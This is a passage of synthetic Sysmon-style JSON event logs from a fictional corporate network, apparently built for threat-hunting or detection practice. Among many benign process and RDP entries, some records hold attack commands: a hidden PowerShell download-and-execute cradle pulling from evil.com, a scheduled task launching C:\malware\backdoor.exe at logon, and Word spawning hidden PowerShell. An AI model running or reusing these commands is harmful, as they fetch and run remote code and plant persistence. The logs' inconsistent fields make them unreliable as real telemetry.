    "UtcTime": "2024-03-08T04:49:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "6380",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0cd88341009d7a6821dd21dea5fa90bf0d08b1ee189104fffee14471fda75322"
    }
  },
  {
    "EventID": 3,
    "Computer": "SERVER-02",
    "UtcTime": "2024-03-05T05:09:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.175",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.30",
      "SourcePort": "55183"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "dave",
    "UtcTime": "2024-03-01T08:06:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
      "CommandLine": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -noprofile -c IEX(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "9210",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=80d8d804397b3a317a449bb68e21be5a3732be9f4806519e258e9f68bc09d66b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-27T01:59:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "9897",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3b064d1b524931edc7ae68f10a3e431cc369eda31f50b346ed47e6e1de121c7b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-01T09:24:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\schtasks.exe",
      "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\malware\\backdoor.exe /sc onlogon",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "5802",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=82ca79c625df70dd4249cb4ee0f67eb57e58f9e7abce34c607172fb6cc6cbdff"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "alice",
    "UtcTime": "2024-03-13T01:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "5191",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3592118eb48add78a4e12148458ca2cfb9f925b6d06aef6810ce74a93e3cd730"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "dave",
    "UtcTime": "2024-03-05T19:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "4076",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0140c6440ddd84cd314d399f6286503aecaca6595027d02988988b2809494104"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-24T03:20:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "1918",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=22d1c3a02327b874765d1a71a0d4ed26b0b6c47165e300bf1dd352fdeca90735"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-13T23:54:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "DestinationIp": "10.0.0.222",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.232",
      "SourcePort": "59772"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "charlie",
    "UtcTime": "2024-03-06T12:16:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8025",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=29cdcb856cdfd6c5b3ddc947d22b96bd9211ff5c9d531ea91146d5f386584918"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-05",
    "UtcTime": "2024-03-23T01:00:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.208",
      "DestinationPort": 443,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.204",
      "SourcePort": "62039"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "dave",
    "UtcTime": "2024-03-08T10:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6720",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5af3e7566b4c96b6fc27e4dc0e6cbcbc04a5c238c0d23f0f42df8eb917b41cb9"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-09T08:41:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "DestinationIp": "10.0.0.107",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.144",
      "SourcePort": "54053"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-02T02:05:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "8649",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d8bbb3453b2ab118bd416022782e85eaee154e4a0f9f4643a11b5893ac43bd9c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-19T02:47:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\notepad.exe",
      "CommandLine": "notepad.exe report.txt",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "4789",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=c28e0ae884c40b4a33503a67910061c24a26e3530236f66296b9f833bc47f0d0"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-06T22:07:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "9396",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=30ba030afffd596de4072d5bb63e3b4473e1b910131647726dbc6f330be8969b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "administrator",
    "UtcTime": "2024-03-03T06:54:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "8651",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e73a87910899fc3ba9cef99148b973d9bd3307b7ffbfd4f7dbbf32e9cfbcc0c8"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-04",
    "UtcTime": "2024-03-11T10:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "DestinationIp": "10.0.0.221",
      "DestinationPort": 3389,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.14",
      "SourcePort": "52018"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "dave",
    "UtcTime": "2024-03-01T11:10:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "6718",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=afc574a6be5116ad1f73367480171e45e7eec1c856d3636f40bbd57ea80f32a5"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-21T12:12:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "4553",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=94b4418e6f4f7ce6c099ce6f0e44774f9765805f471ac0dfa5e7d34d90163d1a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-19T17:05:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "8824",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=304c91174bf8437590d59ee442f6773dc0016f8d69284991c9feb8106aaf5ce9"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-25T13:13:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3348",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=dc1186318417105e1c498a4a0cc50355fd5f5b0f492279d0dd73ccaf018dd4d3"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-27T14:08:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9702",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=522881584af2f62c0206a92cba81597966aaa742bb4e9fe0587a68d9f955764d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-05T15:20:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "5419",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d4a9e14af7cd1419ec32870b442cd194337a0fe718ac0cfeff41958efa637c59"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-09T06:30:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\conhost.exe",
      "CommandLine": "conhost.exe 0xffffffff -ForceV1",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "8306",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=16f2c68dd99e709d471b772af857a87a6201f264f7f43a30bd6a2a432293c8fe"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-22T01:11:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2044",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4115d40ba01b389e5edeaa38997f37994ffaf4b8475f3045e5a7b4bf545d634f"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "administrator",
    "UtcTime": "2024-03-01T08:30:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -c malware",
      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "8271",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=365c45cb0f8b3adce6666916b13adace98cd7713e3a90f29845a6da6450ccb3e"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-14T01:21:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "1323",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=e47b4fecb5c1610fec3b4d0825da4c8b8eb0dc57d539efa9e8670a4f7df8d138"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "charlie",
    "UtcTime": "2024-03-16T07:43:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "6484",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b96eb6f7d0cc1f474c24821626b1dd7c7ecabe0dc13ff1540901c7ff97066e34"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-08",
    "UserName": "bob",
    "UtcTime": "2024-03-01T08:37:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\cmd.exe",
      "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -c malware",
      "ParentImage": "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "1709",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=9adf01790c60e331effd004e52da0b38fc099faf6e884af39b491b2ab1ca0e2c"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-13T19:41:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "7956",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=5dffc604b090ec5b3ac780e55259e324fcfc6b4d21e1ca258683bd70e98dd812"
    }
  },
  {
    "EventID": 1,
    "Computer": "DC-01",
    "UserName": "alice",
    "UtcTime": "2024-03-02T04:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "7280",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=36a99673e0aa8e3a82668e089a61cf8ac0ec832e46d1491422ed506a6d3a4d2d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "charlie",
    "UtcTime": "2024-03-20T06:23:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\wuauclt.exe",
      "CommandLine": "wuauclt.exe /UpdateDeploymentProvider",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "8061",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=fae3ac3ef63d98ae5d192fc0fd77464d79caab26fa56d87faeab747130c3f8b5"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "bob",
    "UtcTime": "2024-03-10T17:51:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "8550",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3fb58631589a92909d9a9d49ce055057945cbe2ea677fdc9e8520c4af439f074"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-03T09:01:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "5641",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=ef01c60cbc5bce83a183bea90cae9955898560b0c108ca0f99684b487c38fa4a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "charlie",
    "UtcTime": "2024-03-05T15:58:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "6635",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=bd112c21414f1251a2957f1a358eba881ff525eb20d1095d6d640d4c138533ee"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-20T03:31:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\dave",
      "ProcessId": "2677",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=d2b0f6905d4208df2182fe5593e6c62f5f5ff8ba93f1e80084c03173b9ec395d"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-03",
    "UserName": "dave",
    "UtcTime": "2024-03-31T04:53:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "2942",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b335c5ad1ec84e75cf4aed025b9a44620e0718df46c5b9ce6aa4dbaa2677a43b"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T09:44:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\schtasks.exe",
      "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\malware\\backdoor.exe /sc onlogon",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "9305",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=275fb3c8d27ef6bed14e373b12a42028cb1da6fc93358ac2a4468a04569a3976"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-04",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-30T12:38:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "9218",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=4cccd123a3526c85ad391ab2a6726ea2c056fc37a11cd7b4c1faa51b7b302fa9"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "bob",
    "UtcTime": "2024-03-28T13:16:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "CommandLine": "MsMpEng.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "6539",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=96a979f54ba960639c113edede31ec0599644dae11beef7050e3798e089a61d0"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "administrator",
    "UtcTime": "2024-03-22T03:32:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\bob",
      "ProcessId": "3339",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=13903df19828e5806b2e984b31f1244c71a72fbb113b2a60e095f76d01cf7973"
    }
  },
